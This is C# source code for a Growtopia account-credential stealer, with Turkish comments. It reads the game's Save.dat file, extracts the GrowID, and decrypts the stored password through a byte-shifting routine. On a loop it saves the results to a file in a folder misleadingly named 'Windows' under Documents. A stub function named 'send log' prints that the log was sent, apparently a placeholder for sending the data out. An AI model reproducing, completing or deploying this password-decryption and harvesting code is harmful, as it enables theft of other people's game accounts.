using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections;
namespace TraceSavedat
{
    class Program
    {
        static void Main(string[] args)
        {
            /* SavedatControl.Tick += new EventHandler(SavedatiKontrolEt_Tick);
              SavedatControl.Interval = 1000;
              SavedatControl.Start();*/
            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)+@"\Windows";
            DirectoryInfo directory = new DirectoryInfo(path);
            if (!File.Exists(path))
            {
                directory.Create();
            }
            TimerBasla(4000);//bir önemi yok, aşşagıdaki thread.sleepten intervalı ayarlayın...
            Console.ReadKey();
        }
        static void LogGonder()
        {
            Console.WriteLine("Log Gonderildi!");
        }
        static string CheckRealTimeSavedat()
        {
            string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat";
            var pattern = new Regex(@"[^\w0-9]");
            string savedata = null;
            var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                {
                    savedata = streamReader.ReadToEnd();
                }
            }

            string cleardata = savedata.Replace("\u0000", " ");
            string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
            string growid = "Growid: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
            string lastworld = "Last World: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
            string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Windows\" + firstgrowid + ".txt";
            string finalpass = "";
            for (int z = 0; z < passwords.Length; z++)
            {
                finalpass +=  passwords[z]+ " " ;
            }
            // Console.WriteLine(growid+" " +finalpass);
          //  Console.WriteLine(growid+" "+finalpass);
            return growid + " " + finalpass;
        }
        static void DosyayiOlustur(string path, string growid, string passwords,string value)
        {
            try
            {
                string[] splitted = passwords.Split(' ');
                FileStream fstream = new FileStream(path, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                StreamWriter writer = new StreamWriter(fstream);
                writer.WriteLine(growid);
                foreach (var sonsifre in splitted)
                {
                    if (!String.IsNullOrEmpty(sonsifre))
                    {
                        writer.WriteLine(sonsifre);
                    }
                  
                }
                writer.Close();
                fstream.Close();
                Console.WriteLine(value);
            }
            catch 
            {

            }
           
        }
        static string FinalControl(string growid,string ilkgrowid, string path, string pass)
        {
            string data1 = CheckRealTimeSavedat();
            string data2 = CheckSavedat(growid);
            if (data1==data2)
            {
                Console.WriteLine("Doğru");
            }
            else if (data1!=data2)
            {
                Console.WriteLine("Değişti!");
                DosyayiOlustur(path,ilkgrowid,pass,"Degisti!");
                LogGonder();
            }
            return null;
        }
        static string CheckSavedat(string username)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)+@"\Windows\"+username+".txt";
            string[] a = File.ReadAllLines(path);
            string log = "";
            for (int i = 0; i < a.Length; i++)
            {
                log +=a[i]+ " ";
            }
            //Console.WriteLine(log);
            return log;
        }
        static void TimerBasla(int interval)
        {
            Timer t = new Timer(TimerCallback,null,0,interval);
        }
        private static void TimerCallback(Object o)
        {
            while (true)
            {
                string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat";
                var pattern = new Regex(@"[^\w0-9]");
                string savedata = null;
                var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                    {
                        savedata = streamReader.ReadToEnd();
                    }
                }

                string cleardata = savedata.Replace("\u0000", " ");
                string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                string growid = "Growid: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                string lastworld = "Last World: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
                string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Windows\" + firstgrowid + ".txt";
                string finalpass = "";
                for (int z = 0; z < passwords.Length; z++)
                {
                    finalpass += " " + passwords[z];
                }
                if (!File.Exists(path))
                {
                    DosyayiOlustur(path, growid, finalpass,"Olustu!");
                    LogGonder();
                }
                else
                {
                    //CheckRealTimeSavedat();
                    //string log1 = CheckSavedat(firstgrowid);
                    string log1 = FinalControl(firstgrowid,growid,path,finalpass);
                    Console.WriteLine(log1);
                }
                Thread.Sleep(2000);

            }
        }
        public class PasswordDec
        {
            public List<string> PPW(byte[] contents)
            {
                List<string> result;
                try
                {
                    string text = "";
                    for (int i = 0; i < contents.Length; i += 1)
                    {
                        byte b = contents[i];
                        string text2 = b.ToString("X2");
                        bool flag = text2 == "00";
                        if (flag)
                        {
                            text += "<>";
                        }
                        else
                        {
                            text += text2;
                        }
                    }
                    bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
                    if (flag2)
                    {
                        string text3 = "74616E6B69645F70617373776F7264";
                        int num = text.IndexOf(text3);
                        int num2 = text.LastIndexOf(text3);
                        bool flag3 = false;
                        string text4;
                        if (flag3)
                        {
                            text4 = string.Empty;
                        }
                        num += text3.Length;
                        int num3 = text.IndexOf("<><><>", num);
                        bool flag4 = false;
                        if (flag4)
                        {
                            text4 = string.Empty;
                        }

                        string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
                        bool flag5 = ((@string.ToCharArray()[0] == 95) ? 1 : 0) == 0;
                        if (flag5)
                        {
                            text4 = text.Substring(num, num3 - num).Trim();
                        }
                        else
                        {
                            num2 += text3.Length;
                            num3 = text.IndexOf("<><><>", num2);
                            text4 = text.Substring(num2, num3 - num2).Trim();
                        }
                        string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
                        int num4 = text.IndexOf(text5);
                        bool flag6 = false;
                        string text6;
                        if (flag6)
                        {
                            text6 = string.Empty;
                        }
                        num4 += text5.Length;
                        int num5 = text.IndexOf("<><><>", num4);
                        bool flag7 = false;
                        if (flag7)
                        {
                            text6 = string.Empty;
                        }

                        text6 = text.Substring(num4, num5 - num4).Trim();
                        int num6 = StringToByteArray(text4)[0];
                        text6 = text6.Substring(0, num6 * 2);
                        byte[] array = StringToByteArray(text6.Replace("<>", "00"));
                        List<byte> list = new List<byte>();
                        List<byte> list2 = new List<byte>();
                        byte b2 = (byte)(48 - array[0]);
                        byte[] array2 = array;
                        for (int j = 0; j < array2.Length; j += 1)
                        {
                            byte b3 = array2[j];
                            list.Add((byte)(b2 + b3));
                        }
                        for (int k = 0; k < list.Count; k += 1)
                        {
                            list2.Add((byte)(list[k] - 1 - k));
                        }
                        List<string> list3 = new List<string>();
                        int num7 = 0;
                        while ((num7 > 255 ? 1 : 0) == 0)
                        {
                            string text7 = "";
                            foreach (byte b4 in list2)
                            {
                                bool flag8 = ValidateChar((char)((byte)((int)b4 + num7)));
                                if (flag8)
                                {
                                    text7 += ((char)((byte)((int)b4 + num7))).ToString();
                                }
                            }
                            bool flag9 = text7.Length == num6;
                            if (flag9)
                            {
                                list3.Add(text7);
                            }
                            num7 += 1;
                        }
                        result = list3;
                    }
                    else
                    {
                        result = null;
                    }
                }
                catch
                {
                    result = null;
                }
                return result;
            }
            public byte[] StringToByteArray(string str)
            {
                Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
                for (int i = 0; i <= 255; i++)
                    hexindex.Add(i.ToString("X2"), (byte)i);

                List<byte> hexres = new List<byte>();
                for (int i = 0; i < str.Length; i += 2)
                    hexres.Add(hexindex[str.Substring(i, 2)]);

                return hexres.ToArray();
            }
            private bool ValidateChar(char cdzdshr)
            {
                if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
                        (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
                        (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
                        (cdzdshr >= 0x2B && cdzdshr <= 0x2E)) return true;
                else return false;
            }

            public string[] Func(byte[] lel)
            {
                byte[] buff = lel;
                var passwords = PPW(buff);
                return passwords.ToArray();
            }
        }

    }
}
